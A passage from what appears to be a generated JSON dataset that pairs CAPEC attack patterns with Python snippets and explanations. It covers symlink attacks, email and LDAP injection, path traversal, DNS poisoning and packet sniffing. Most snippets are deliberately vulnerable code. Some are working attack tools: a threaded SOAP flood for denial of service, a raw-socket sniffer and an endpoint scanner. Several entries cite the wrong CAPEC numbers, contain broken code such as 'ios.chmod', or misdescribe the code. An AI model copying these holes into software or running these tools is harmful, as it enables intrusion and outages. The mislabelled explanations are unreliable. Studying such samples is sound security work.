        "description": "This Python code snippet demonstrates a resource leak vulnerability by improperly managing a lock resource. The `Resource` class uses a threading lock to manage access to a shared resource list. The `add_data` method acquires the lock but fails to release it, simulating an improper resource shutdown or release (CWE-404). This can lead to resource depletion, as the lock is never released, preventing other threads from accessing the resource. The `get_data` method correctly acquires and releases the lock, but due to the improper release in `add_data`, it may never get a chance to execute properly. This embodies the main idea of the CAPEC by showing how resource leaks can deplete available resources, affecting legitimate requests."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\n\n# Function to read a file's content\ndef read_file(file_path):\n    try:\n        # Check if the file exists\n        if os.path.exists(file_path):\n            # Open the file and read its content\n            with open(file_path, 'r') as file:\n                return file.read()\n        else:\n            return 'File does not exist.'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input_path = '/tmp/user_input_file'\nprint(read_file(user_input_path))",
        "description": "This Python code snippet demonstrates a potential vulnerability to a symlink attack. The `read_file` function takes a file path as input, checks if the file exists using `os.path.exists`, and then opens and reads the file's content. However, this code does not account for the possibility that the file path could be a symbolic link pointing to a sensitive file outside the intended control sphere. An attacker could exploit this by creating a symlink at `/tmp/user_input_file` that points to a sensitive file, causing the function to read and potentially expose the contents of that sensitive file. This embodies the main idea of the CAPEC 'Symlink Attack' and relates to CWEs such as 'Improper Link Resolution Before File Access' and 'UNIX Symbolic Link (Symlink) Following'."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import subprocess\n\n# List of common switches to try\ncommon_switches = ['--debug', '--verbose', '--test', '--config', '--admin']\n\n# Function to test switches on a target application\ndef test_switches(target_app):\n    for switch in common_switches:\n        try:\n            # Attempt to invoke the target application with the switch\n            result = subprocess.run([target_app, switch], capture_output=True, text=True)\n            print(f'Testing {switch}:')\n            print(result.stdout)\n            print(result.stderr)\n        except Exception as e:\n            print(f'Error testing {switch}: {e}')\n\n# Example usage\nif __name__ == '__main__':\n    target_application = 'example_app'\n    test_switches(target_application)",
        "description": "This Python code snippet demonstrates the 'Try All Common Switches' attack pattern (CAPEC-139). The script defines a list of common command-line switches and attempts to invoke a target application with each switch. The goal is to discover any hidden or undocumented functionality (CWE-912) that might be exposed by these switches. The script captures and prints the output and errors for each switch, which could reveal sensitive information or weaknesses. The code also handles exceptions (CWE-391) to ensure that errors during the invocation process are not ignored. This approach can help identify incomplete input validation (CWE-184) and issues related to debug components (CWE-1296) or deep invocation layers (CWE-1054)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'sender@example.com'\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # SMTP server configuration\n    smtp_server = 'smtp.example.com'\n    smtp_port = 587\n\n    # Establish connection to the SMTP server\n    server = smtplib.SMTP(smtp_server, smtp_port)\n    server.starttls()\n    server.login('username', 'password')\n\n    # Send the email\n    server.sendmail(from_address, [to_address], msg.as_string())\n    server.quit()\n\n# Example usage\nuser_input = \"victim@example.com\\nBCC: attacker@example.com\"\nsend_email(user_input, 'Test Subject', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that is susceptible to email injection attacks. The function `send_email` takes user input for the recipient's email address (`to_address`), subject, and body of the email. The user input is directly used to construct the email headers without proper sanitization or neutralization of special characters. This can allow an attacker to inject additional email headers, such as BCC, by including newline characters in the `to_address` input. The example usage shows how an attacker can exploit this vulnerability by injecting a BCC header to send the email to an unintended recipient. This code embodies the main idea of CAPEC-139 (Email Injection) and highlights related weaknesses such as improper neutralization of input terminators (CWE-147) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import sys\n\ndef vulnerable_function(user_input):\n    print(user_input)\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <input>\")\n        sys.exit(1)\n    user_input = sys.argv[1]\n    vulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a basic example of a format string injection vulnerability. The `vulnerable_function` takes `user_input` as an argument and directly prints it using the `print` function. If an attacker provides a string with format specifiers (e.g., `%s`, `%n`), it could lead to unexpected behavior or security issues. The code does not validate or sanitize the input, which is a common cause of such vulnerabilities. This example aligns with the CAPEC description and related CWEs, particularly CWE-134 (Use of Externally-Controlled Format String) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\n# Establish a connection to the LDAP server\nconn = ldap.initialize('ldap://localhost')\n\n# User input (potentially malicious)\nusername = input('Enter your username: ')\n\n# Constructing the LDAP query without proper input validation\nldap_query = f\"(uid={username})\"\n\ntry:\n    # Perform the search operation\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_query)\n    print('Search results:', result)\nexcept ldap.LDAPError as e:\n    print('LDAP error:', e)",
        "description": "This Python code snippet demonstrates a basic LDAP query that is vulnerable to LDAP Injection. The code establishes a connection to an LDAP server and constructs an LDAP query using user input without proper input validation or neutralization of special characters. An attacker could exploit this by entering special characters or additional LDAP commands to manipulate the query, potentially disclosing sensitive information or altering the behavior of the LDAP server. This example highlights the importance of validating and sanitizing user inputs to prevent injection attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable code: directly using user input in a URL\n    url = f'http://example.com/search?query={query}'\n    # Simulate a request to the constructed URL\n    response = simulate_request(url)\n    return response\n\ndef simulate_request(url):\n    # This function simulates making a request to the constructed URL\n    return f'Request sent to: {url}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with a vulnerable endpoint '/search'. The endpoint takes a 'query' parameter from the HTTP GET request and constructs a URL using this parameter without proper validation or encoding. This can lead to parameter injection attacks, where an attacker can manipulate the 'query' parameter to inject additional parameters or modify existing ones. For example, if the user provides 'myInput&new_param=myValue' as the query, the constructed URL will be 'http://example.com/search?query=myInput&new_param=myValue', which changes the intended query. This snippet embodies the main idea of CAPEC-137 (Parameter Injection) and highlights related weaknesses such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import importlib\n\n# Simulate external input\nuser_input = 'os'\n\n# Unsafe reflection based on user input\ntry:\n    module = importlib.import_module(user_input)\n    print(f'Module {user_input} loaded successfully.')\n    # Potentially dangerous method invocation\n    method = getattr(module, 'system')\n    method('echo Hello World')\nexcept Exception as e:\n    print(f'An error occurred: {e}')",
        "description": "This Python code snippet demonstrates a reflection injection vulnerability. The code uses the `importlib` library to dynamically import a module based on user input. If the user input is 'os', the code will import the 'os' module and then use the `getattr` function to access the 'system' method, which is then invoked with a command. This can lead to command injection, allowing an attacker to execute arbitrary commands on the system. The code embodies the main idea of the CAPEC by showing how an adversary can control the input to reflection methods, leading to potentially dangerous operations. The related CWEs are represented by the use of externally-controlled input to select classes or code (CWE-470), and the improper neutralization of special elements in commands (CWE-77)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Invalid file path')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a relative path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/html`). The code attempts to prevent path traversal by checking if the constructed `full_path` starts with the `base_directory`. However, this check is insufficient because it does not properly neutralize sequences like '../', which can allow an attacker to access files outside the intended directory. For example, providing '../../etc/passwd' as input can lead to reading the system's password file, demonstrating the vulnerability described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, redirect, url_for, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if request.method == 'POST':\n        session['form1_data'] = request.form['data']\n        return redirect(url_for('form2'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if 'form1_data' not in session:\n        return redirect(url_for('form1'))\n    if request.method == 'POST':\n        session['form2_data'] = request.form['data']\n        return redirect(url_for('form3'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if 'form2_data' not in session:\n        return redirect(url_for('form2'))\n    if request.method == 'POST':\n        session['form3_data'] = request.form['data']\n        return 'All forms completed!'\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a multi-form web application. The application consists of three forms (form1, form2, and form3) that must be completed in sequence. The session object is used to store data from each form. If a user tries to access form2 or form3 without completing the previous forms, they are redirected back to the appropriate form. This code demonstrates the concept of 'Bypassing of Intermediate Forms in Multiple-Form Sets' (CAPEC) by showing how an attacker might skip forms if the application does not properly enforce the sequence. The code also highlights related CWEs such as CWE-372 (Incomplete Internal State Distinction) by ensuring the application checks the session state before allowing access to subsequent forms."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\n# Function to fetch data from a URL and cache it\ncache = {}\ntrusted_sources = ['https://trusted.com/data']\n\n\ndef fetch_data(url):\n    if url in cache:\n        return cache[url]\n    response = requests.get(url)\n    if response.status_code == 200:\n        cache[url] = response.text\n        return response.text\n    return None\n\n\n# Fetch data from a less trusted source\nurl = 'https://untrusted.com/data'\ndata = fetch_data(url)\n\n# Use the cached data without verifying its authenticity\nif data:\n    print('Data fetched and cached:', data)\n\n# Fetch data from a trusted source\nurl = 'https://trusted.com/data'\ndata = fetch_data(url)\n\n# Use the cached data without verifying its authenticity\nif data:\n    print('Data fetched and cached:', data)\n",
        "description": "This Python code snippet demonstrates a cache poisoning vulnerability. The `fetch_data` function fetches data from a given URL and caches it. The cache is a simple dictionary that stores the URL as the key and the fetched data as the value. The code does not verify the authenticity of the data fetched from the URL, which can lead to cache poisoning if data from a less trusted source is cached. The code fetches data from both a trusted and an untrusted source, but it treats the data from both sources equally without proper validation. This can lead to the use of incorrect or harmful data from the cache, embodying the main idea of the CAPEC and related CWEs."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import socket\n\n# Function to resolve domain name to IP address\ndef resolve_domain(domain):\n    try:\n        ip = socket.gethostbyname(domain)\n        return ip\n    except socket.gaierror:\n        return None\n\n# Function to simulate DNS cache poisoning\n# This function does not verify the authenticity of the DNS response\n# and accepts untrusted data as if it were trusted\n\ndef poisoned_dns_cache(domain):\n    # Simulated poisoned cache\n    poisoned_cache = {\n        'www.example.com': '192.168.1.100'  # Malicious IP address\n    }\n    \n    # Check if domain is in poisoned cache\n    if domain in poisoned_cache:\n        return poisoned_cache[domain]\n    else:\n        return resolve_domain(domain)\n\n# Example usage\nif __name__ == '__main__':\n    domain = 'www.example.com'\n    ip_address = poisoned_dns_cache(domain)\n    if ip_address:\n        print(f'The IP address for {domain} is {ip_address}')\n    else:\n        print(f'Failed to resolve domain: {domain}')",
        "description": "This Python code snippet demonstrates a simplified version of DNS cache poisoning. The `resolve_domain` function resolves a domain name to an IP address using the system's DNS resolver. The `poisoned_dns_cache` function simulates a poisoned DNS cache by returning a malicious IP address for a specific domain without verifying the authenticity of the DNS response. This embodies the main idea of DNS cache poisoning (CAPEC-139) and highlights related weaknesses such as insufficient verification of data authenticity (CWE-345) and acceptance of untrusted data (CWE-349). The code shows how an adversary can manipulate DNS responses to redirect users to malicious sites."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\nfrom flask import Flask, send_from_directory, request, abort\n\napp = Flask(__name__)\n\n# CWE-219: Sensitive data stored under web root\nSENSITIVE_DIR = os.path.join(app.root_path, 'sensitive_data')\n\n@app.route('/<path:filename>', methods=['GET'])\ndef serve_file(filename):\n    # CWE-425: Direct Request ('Forced Browsing')\n    if not request.args.get('auth_token'):\n        abort(403)  # Unauthorized access\n    try:\n        # CWE-527: Exposure of Version-Control Repository\n        if filename.startswith('.git'):\n            abort(403)  # Block access to version control directories\n        # CWE-612: Improper Authorization of Index Containing Sensitive Information\n        if filename == 'index.html':\n            abort(403)  # Block access to sensitive index file\n        return send_from_directory(SENSITIVE_DIR, filename)\n    except FileNotFoundError:\n        abort(404)  # File not found\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web server that serves files from a sensitive directory. The code demonstrates several security weaknesses: \n1. CWE-219: Sensitive data is stored under the web root directory (`SENSITIVE_DIR`).\n2. CWE-425: The server does not adequately enforce authorization, relying on a simple query parameter (`auth_token`) for access control.\n3. CWE-527: The code attempts to block access to version control directories (e.g., `.git`), but this is done in an ad-hoc manner.\n4. CWE-612: The code blocks access to an `index.html` file, which could contain sensitive information, but this is also done in an ad-hoc manner.\n\nThe main idea of the CAPEC is represented by the potential for an adversary to discover and access unpublicized web pages or sensitive files due to improper access controls and storage practices."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import requests\n\n# URL of the target web application\nbase_url = 'http://example.com/'\n\n# List of potential unpublicized web services\nendpoints = [\n    'admin',\n    'hidden',\n    'private',\n    'config',\n    'backup',\n    'wsdl'\n]\n\n# Function to check the existence of unpublicized web services\nfor endpoint in endpoints:\n    url = f'{base_url}{endpoint}'\n    response = requests.get(url)\n    if response.status_code == 200:\n        print(f'Unpublicized web service found: {url}')\n        if 'wsdl' in url:\n            print(f'Potential exposure of WSDL file: {url}')\n        # Additional checks for other CWEs can be added here\n    else:\n        print(f'No service at: {url}')",
        "description": "This Python code snippet demonstrates how an adversary might search for unpublicized web services on a target web application. The script iterates through a list of common endpoint names that might not be publicized but could exist on the server. For each endpoint, it constructs a URL and sends a GET request to check if the endpoint is accessible. If the server responds with a status code of 200, it indicates that the endpoint exists and is accessible. The script also checks if the endpoint might expose a WSDL file, which could contain sensitive information about the web services. This approach leverages CWE-425 (Direct Request), CWE-651 (Exposure of WSDL File), and highlights the potential risks of unpublicized services being accessible without adequate security controls."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\n# Simulate sending a message with a checksum\nmessage = \"Important data\"\nchecksum = hashlib.md5(message.encode()).hexdigest()\n\n# Adversary modifies the message and recalculates the checksum\nmodified_message = \"Tampered data\"\nspoofed_checksum = hashlib.md5(modified_message.encode()).hexdigest()\n\n# Simulate receiving the message and verifying the checksum\nreceived_message = modified_message\nreceived_checksum = spoofed_checksum\n\n# Receiver calculates checksum of the received message\ncalculated_checksum = hashlib.md5(received_message.encode()).hexdigest()\n\n# Check if the received checksum matches the calculated checksum\nif received_checksum == calculated_checksum:\n    print(\"Message integrity verified.\")\nelse:\n    print(\"Message integrity compromised.\")",
        "description": "This Python code snippet demonstrates a scenario of checksum spoofing. Initially, a message is sent with its MD5 checksum. An adversary then modifies the message and recalculates the checksum to match the modified message. When the recipient receives the tampered message and its corresponding checksum, they calculate the checksum of the received message and compare it with the received checksum. Since the checksums match, the recipient incorrectly believes the message integrity is verified. This example highlights the vulnerability of using weak hash functions (CWE-328) and improper validation of integrity check values (CWE-354), leading to potential undetected message tampering."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that processes XML data\n\ndef process_xml(xml_data, schema_data):\n    try:\n        # Parse the XML schema\n        schema_root = ET.fromstring(schema_data)\n        schema = ET.ElementTree(schema_root)\n\n        # Parse the XML data\n        xml_root = ET.fromstring(xml_data)\n        xml_tree = ET.ElementTree(xml_root)\n\n        # Validate XML against the schema (missing validation step)\n        # This is where the validation should occur, but it is missing\n        # xml_tree.validate(schema)\n\n        # Process the XML data\n        for elem in xml_tree.iter():\n            print(elem.tag, elem.text)\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Example usage\nxml_data = '''<data><item>Example</item></data>'''\nschema_data = '''<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n<xs:element name=\"data\">\n<xs:complexType>\n<xs:sequence>\n<xs:element name=\"item\" type=\"xs:string\"/>\n</xs:sequence>\n</xs:complexType>\n</xs:element>\n</xs:schema>'''\n\nprocess_xml(xml_data, schema_data)",
        "description": "This Python code snippet demonstrates a vulnerable function `process_xml` that processes XML data based on a provided XML schema. The function parses both the XML data and the schema but fails to validate the XML data against the schema, which is a critical step to ensure the integrity and security of the XML processing. This missing validation step (CWE-112) allows an attacker to manipulate the XML schema (CAPEC-15) and potentially inject malicious content (CWE-91, CWE-643). The code highlights the importance of proper XML validation to prevent schema poisoning and related vulnerabilities."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import requests\nimport threading\n\n# Function to send a SOAP request\ndef send_soap_request(url, xml_payload):\n    headers = {'Content-Type': 'text/xml'}\n    response = requests.post(url, data=xml_payload, headers=headers)\n    return response.status_code\n\n# XML payload (unvalidated and potentially harmful)\nxml_payload = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Ping/>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Target URL\nurl = 'http://target.example.com/soap'\n\n# Function to perform the attack\ndef perform_attack():\n    while True:\n        send_soap_request(url, xml_payload)\n\n# Create multiple threads to simulate rapid, repetitive SOAP transactions\nthreads = []\nfor i in range(100):\n    thread = threading.Thread(target=perform_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads to ensure they run indefinitely\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a denial-of-service (DoS) attack using the 'XML Ping of the Death' method. The code sends a large number of small SOAP messages to a target URL in rapid succession, causing resource depletion on the target server. The XML payload is not validated, and the attack is performed using multiple threads to increase the rate of requests. This example embodies the main idea of CAPEC-230 by exploiting CWEs such as Uncontrolled Resource Consumption (CWE-400), Allocation of Resources Without Limits or Throttling (CWE-770), and Missing XML Validation (CWE-112)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['GET'])\ndef fetch_content():\n    url = request.args.get('url')\n    if not url:\n        return 'URL parameter is missing', 400\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return render_template_string(response.text)\n        else:\n            return 'Failed to fetch content', 500\n    except requests.RequestException as e:\n        return f'Error fetching content: {str(e)}', 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that fetches and displays content from a URL provided as a query parameter. The main idea of the CAPEC (Content Spoofing) is embodied in this code by allowing an adversary to potentially modify the content fetched from the specified URL. The related CWEs are represented as follows:\n\n1. CWE-345 (Insufficient Verification of Data Authenticity): The code does not verify the authenticity of the fetched content, making it susceptible to spoofed or malicious content.\n2. CWE-924 (Improper Enforcement of Message Integrity During Transmission): The code does not ensure the integrity of the content during transmission, allowing for potential tampering.\n3. CWE-433 (Unparsed Raw Web Content Delivery): The fetched content is directly rendered without parsing or sanitization, which can lead to security issues.\n4. CWE-352 (Cross-Site Request Forgery): Although not directly shown, the lack of CSRF protection in the Flask route can be exploited in a broader context.\n5. CWE-941 (Incorrectly Specified Destination in a Communication Channel): The code does not validate the destination URL, which can lead to fetching content from unintended or malicious sources.\n\nOverall, this code snippet highlights the risks associated with content spoofing and the importance of verifying and sanitizing external content."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\ntmp_dir = '/tmp'\ntmp_file = os.path.join(tmp_dir, 'app_temp_file.txt')\n\n# Create a temporary file with predictable name\nwith open(tmp_file, 'w') as f:\n    f.write('Sensitive data')\n\n# Insecure permissions: world-readable and writable\nios.chmod(tmp_file, 0o777)\n\nprint(f'Temporary file created at: {tmp_file}')",
        "description": "This Python code snippet demonstrates the creation of a temporary file with a predictable name in a directory with insecure permissions. The temporary file is named 'app_temp_file.txt' and is created in the '/tmp' directory. The file is then given world-readable and writable permissions (0o777), making it accessible to any user on the system. This embodies the main idea of CAPEC-27, 'Explore for Predictable Temporary File Names', by showing how an attacker could predict the name and location of a temporary file and exploit its insecure permissions. The related CWEs are represented by the insecure creation and permission settings of the temporary file, making it vulnerable to unauthorized access and manipulation."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# Example of a sensitive configuration file path\nconfig_file_path = '/etc/sensitive_config.conf'\n\n# Function to read the configuration file\n# This function does not check for proper permissions\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-1330: Remanent Data Readable after Memory Erase\n\ndef read_config_file(path):\n    try:\n        with open(path, 'r') as file:\n            data = file.read()\n            return data\n    except FileNotFoundError:\n        return 'Configuration file not found.'\n    except PermissionError:\n        return 'Permission denied.'\n\n# Function to clear sensitive data from the configuration file\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\ndef clear_sensitive_data(path):\n    try:\n        with open(path, 'w') as file:\n            file.write('')\n    except FileNotFoundError:\n        return 'Configuration file not found.'\n    except PermissionError:\n        return 'Permission denied.'\n\n# Read the configuration file\nconfig_data = read_config_file(config_file_path)\nprint(config_data)\n\n# Clear the sensitive data from the configuration file\nclear_sensitive_data(config_file_path)\n",
        "description": "This Python code snippet demonstrates a scenario where an adversary could exploit well-known locations for resources, such as configuration files stored in the '/etc' directory on Unix systems. The 'read_config_file' function reads a sensitive configuration file without checking for proper permissions, which aligns with CWE-552 (Files or Directories Accessible to External Parties). The 'clear_sensitive_data' function attempts to clear the sensitive data from the configuration file, but it does so by simply writing an empty string, which may not be sufficient to prevent data recovery, aligning with CWE-1330 (Remanent Data Readable after Memory Erase) and CWE-1266 (Improper Scrubbing of Sensitive Data from Decommissioned Device). This code highlights the risks associated with improper handling of sensitive files and the importance of secure data management practices."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Simulated login attempt\nusername = 'user1'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that embodies the concept of Identity Spoofing (CAPEC-151). The code uses MD5 hashing for password storage and verification, which is considered weak (CWE-327). The `authenticate` function checks if the provided username exists in the user database and if the hashed password matches the stored hash. This simplistic approach to authentication is susceptible to various attacks, including password spoofing and brute force attacks, due to the weak hashing algorithm and lack of additional security measures such as salting or rate limiting. The code highlights the risks associated with improper authentication (CWE-287) and weak authentication mechanisms (CWE-1390)."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import re\n\ndef process_user_input(user_input):\n    # Improper validation of input\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        raise ValueError('Invalid input')\n    \n    # Reliance on untrusted input in a security decision\n    if user_input == 'admin':\n        print('Access granted to admin panel')\n    else:\n        print('Access denied')\n\n# Example usage\nuser_input = input('Enter your username: ')\nprocess_user_input(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The `process_user_input` function attempts to validate the user input using a regular expression that only allows alphanumeric characters. However, this validation is insufficient for ensuring the input's safety and correctness. Additionally, the function makes a security decision based on the user input, granting access to an 'admin' panel if the input matches the string 'admin'. This reliance on untrusted input can be exploited by an attacker to gain unauthorized access. The code embodies the main idea of CAPEC-137: Input Data Manipulation, and highlights related CWEs such as Improper Input Validation (CWE-20) and Reliance on Untrusted Inputs in a Security Decision (CWE-807)."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Simulated user input for resource location\nuser_input_url = 'http://trusted-site.com/resource'\n\n# Adversary-controlled URL (spoofed location)\nspoofed_url = 'http://malicious-site.com/resource'\n\n# Function to fetch resource from a given URL\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-290: Authentication Bypass by Spoofing\n\ndef fetch_resource(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.content\n        else:\n            return 'Error: Unable to fetch resource'\n    except Exception as e:\n        return f'Error: {str(e)}'\n\n# Simulating the spoofing attack by using the spoofed URL instead of the user input URL\nresource_content = fetch_resource(spoofed_url)\nprint(resource_content)",
        "description": "This Python code snippet demonstrates a resource location spoofing attack. The user intends to fetch a resource from a trusted URL ('http://trusted-site.com/resource'), but an adversary manipulates the application to use a spoofed URL ('http://malicious-site.com/resource') instead. The `fetch_resource` function attempts to retrieve the resource from the given URL without verifying its authenticity or ensuring it is the intended endpoint. This lack of proper verification and restriction (CWE-940, CWE-923) allows the adversary to deceive the application (CWE-941) and potentially bypass authentication mechanisms (CWE-290). The user interface does not properly represent critical information, leading to misrepresentation (CWE-451)."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: User Passwords')\n    temp_file_path = temp_file.name\n\n# Simulate insecure permissions (world-readable)\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate storing the temporary file in a web root directory\nweb_root_path = '/var/www/html/temp_sensitive_info.txt'\nos.rename(temp_file_path, web_root_path)\nprint(f'Temporary file moved to web root: {web_root_path}')",
        "description": "This Python code snippet demonstrates the creation and insecure handling of a temporary file containing sensitive information. The code creates a temporary file and writes sensitive data to it. It then sets insecure permissions on the file, making it world-readable (CWE-378). Finally, it moves the temporary file to a web root directory, making it accessible to untrusted parties (CWE-219). This example embodies the main idea of CAPEC- Screen Temporary Files for Sensitive Information, highlighting the risks associated with insecure temporary file handling and storage."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\n# This function sends sensitive data over a network without encryption\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\ndef send_sensitive_data(data, server_ip, server_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(data.encode('utf-8'))\n        response = s.recv(1024)\n        print('Received', repr(response))\n\n# Example usage\nsensitive_data = 'username=admin&password=secret'\nserver_ip = '192.168.1.1'\nserver_port = 12345\nsend_sensitive_data(sensitive_data, server_ip, server_port)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending sensitive data over a network. The function `send_sensitive_data` transmits sensitive information (e.g., username and password) in cleartext without any encryption, making it susceptible to sniffing attacks (CAPEC-158). This embodies CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data). An attacker who can observe the network traffic can easily intercept and read the sensitive data being transmitted."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\n# Create a raw socket to sniff network traffic\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to the public network interface\nsniffer.bind(('0.0.0.0', 0))\n\n# Include IP headers in the capture\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Sniffing network traffic...')\n\ntry:\n    while True:\n        # Receive a packet\n        packet, addr = sniffer.recvfrom(65565)\n        # Print the raw packet data\n        print(packet)\nexcept KeyboardInterrupt:\n    print('Stopping the sniffer')\n    sniffer.close()",
        "description": "This Python code snippet demonstrates a basic network sniffer using raw sockets. The sniffer captures TCP/IP packets on a public network interface and prints the raw packet data. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by passively monitoring network traffic to capture sensitive information. The code does not encrypt the captured data (CWE-311), transmits sensitive information in cleartext (CWE-319), and could potentially expose sensitive system information (CWE-497). The sniffer operates passively, observing and analyzing traffic without being an intended recipient, aligning with the CAPEC description."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
